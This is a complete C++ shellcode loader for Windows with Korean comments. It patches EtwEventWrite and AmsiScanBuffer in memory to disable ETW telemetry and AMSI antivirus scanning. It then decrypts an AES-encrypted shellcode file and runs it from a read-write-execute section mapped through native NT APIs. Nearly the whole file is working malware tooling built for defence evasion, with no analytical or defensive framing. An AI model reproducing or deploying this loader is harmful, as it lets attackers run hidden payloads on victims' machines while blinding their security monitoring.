// Loader.cpp
// 빌드: g++ -o loader.exe Loader.cpp -lbcrypt

#include <windows.h>
#include <bcrypt.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <winternl.h>

#pragma comment(lib, "bcrypt.lib")

// Native API typedefs
typedef NTSTATUS(NTAPI* NtCreateSection_t)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);

typedef NTSTATUS(NTAPI* NtMapViewOfSection_t)(
    HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER,
    PSIZE_T, DWORD, ULONG, ULONG);

// 바이너리 파일 읽기
std::vector<BYTE> ReadBinary(const std::string& path) {
    std::ifstream f(path, std::ios::binary);
    if (!f) return {};
    return std::vector<BYTE>((std::istreambuf_iterator<char>(f)), {});
}

// AES-256-CBC 복호화 ([키][IV][암호문] 구조)
std::vector<BYTE> DecryptAES(const std::vector<BYTE>& input) {
    if (input.size() < 48) return {};

    std::vector<BYTE> key(input.begin(), input.begin() + 32);
    std::vector<BYTE> iv(input.begin() + 32, input.begin() + 48);
    std::vector<BYTE> encrypted(input.begin() + 48, input.end());

    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;

    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0)
        return {};

    if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
        (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0) != 0) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return {};
    }

    DWORD keyObjLen = 0, dataLen = 0;
    if (BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH,
        (PUCHAR)&keyObjLen, sizeof(DWORD), &dataLen, 0) != 0) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return {};
    }

    std::vector<BYTE> keyObj(keyObjLen);

    if (BCryptGenerateSymmetricKey(hAlg, &hKey, keyObj.data(), keyObjLen, key.data(),
        static_cast<ULONG>(key.size()), 0) != 0) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return {};
    }

    DWORD plainLen = 0;
    if (BCryptDecrypt(hKey, encrypted.data(), static_cast<ULONG>(encrypted.size()), NULL,
        iv.data(), static_cast<ULONG>(iv.size()), NULL, 0, &plainLen, BCRYPT_BLOCK_PADDING) != 0) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return {};
    }

    std::vector<BYTE> decrypted(plainLen);
    if (BCryptDecrypt(hKey, encrypted.data(), static_cast<ULONG>(encrypted.size()), NULL,
        iv.data(), static_cast<ULONG>(iv.size()), decrypted.data(),
        plainLen, &plainLen, BCRYPT_BLOCK_PADDING) != 0) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return {};
    }
    decrypted.resize(plainLen);

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    return decrypted;
}

// ETW 우회 - EtwEventWrite 패치
void PatchETW() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return;

    void* etwEventWriteAddr = GetProcAddress(ntdll, "EtwEventWrite");
    if (!etwEventWriteAddr) return;

    DWORD oldProtect;
    if (VirtualProtect(etwEventWriteAddr, 4, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        BYTE patch[] = { 0xC3, 0x90, 0x90, 0x90 }; // ret; nop; nop; nop
        memcpy(etwEventWriteAddr, patch, sizeof(patch));
        VirtualProtect(etwEventWriteAddr, 4, oldProtect, &oldProtect);
    }
}

// AMSI 우회 - AmsiScanBuffer 패치
void PatchAMSI() {
    HMODULE amsi = GetModuleHandleA("amsi.dll");
    if (!amsi) amsi = LoadLibraryA("amsi.dll");
    if (!amsi) return;

    void* amsiScanBufAddr = GetProcAddress(amsi, "AmsiScanBuffer");
    if (!amsiScanBufAddr) return;

    DWORD oldProtect;
    if (VirtualProtect(amsiScanBufAddr, 6, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; // mov eax, 0x80070057; ret
        memcpy(amsiScanBufAddr, patch, sizeof(patch));
        VirtualProtect(amsiScanBufAddr, 6, oldProtect, &oldProtect);
    }
}

int main(int argc, char* argv[]) {
    if (argc != 2) {
        std::cout << "Usage: loader.exe <encrypted_shellcode.bin>\n";
        return 1;
    }

    // 1. ETW 및 AMSI 패치를 가능한 한 빨리 수행
    PatchETW();
    PatchAMSI();

    // 2. 암호화된 쉘코드 파일 읽기
    std::vector<BYTE> input = ReadBinary(argv[1]);
    if (input.size() < 48) {
        std::cout << "Invalid encrypted file.\n";
        return 1;
    }

    // 3. AES 복호화
    std::vector<BYTE> shellcode = DecryptAES(input);
    if (shellcode.empty()) {
        std::cout << "Decryption failed.\n";
        return 1;
    }

    // 4. NtCreateSection, NtMapViewOfSection 함수 포인터 로드
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) {
        std::cout << "ntdll.dll not found.\n";
        return 1;
    }

    auto NtCreateSection = (NtCreateSection_t)GetProcAddress(ntdll, "NtCreateSection");
    auto NtMapViewOfSection = (NtMapViewOfSection_t)GetProcAddress(ntdll, "NtMapViewOfSection");

    if (!NtCreateSection || !NtMapViewOfSection) {
        std::cout << "Native API not found.\n";
        return 1;
    }

    // 5. RWX 섹션 생성
    HANDLE hSection = NULL;
    LARGE_INTEGER maxSize;
    maxSize.QuadPart = shellcode.size();

    NTSTATUS status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &maxSize,
        PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

    if (status != 0 || !hSection) {
        std::cout << "NtCreateSection failed.\n";
        return 1;
    }

    // 6. 섹션 매핑
    PVOID baseAddress = NULL;
    SIZE_T viewSize = 0;

    status = NtMapViewOfSection(hSection, GetCurrentProcess(),
        &baseAddress, 0, 0, NULL, &viewSize,
        2 /* ViewUnmap */, 0, PAGE_EXECUTE_READWRITE);

    if (status != 0 || !baseAddress) {
        std::cout << "NtMapViewOfSection failed.\n";
        CloseHandle(hSection);
        return 1;
    }

    // 7. 복호화된 쉘코드 복사
    memcpy(baseAddress, shellcode.data(), shellcode.size());

    // 8. 스레드 생성 및 실행
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)baseAddress, NULL, 0, NULL);
    if (!hThread) {
        std::cout << "CreateThread failed.\n";
        CloseHandle(hSection);
        return 1;
    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    CloseHandle(hSection);

    return 0;
}
